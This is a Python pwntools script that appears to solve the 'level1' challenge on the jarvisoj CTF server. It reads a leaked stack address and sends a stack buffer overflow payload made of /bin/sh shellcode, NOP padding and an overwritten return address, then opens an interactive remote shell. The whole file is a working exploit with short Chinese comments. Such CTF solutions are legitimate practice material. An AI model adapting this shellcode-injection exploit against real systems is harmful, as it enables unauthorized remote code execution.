#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python3

from pwn import *
context(log_level = 'debug', arch = 'i386', os = 'linux') # 能显示调试信息

shellcode = asm(shellcraft.sh())
#io = process('./level1')
io = remote('pwn2.jarvisoj.com', 9877)
text = io.recvline()[14: -2] # b"What's this:0xfff06990?\n" 14:-2是 fff06990
#print text[14:-2]
buf_addr = int(text, 16)

payload = shellcode.decode('latin') + '\x90' * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr).decode('latin')
io.send(payload)
io.interactive()
io.close()
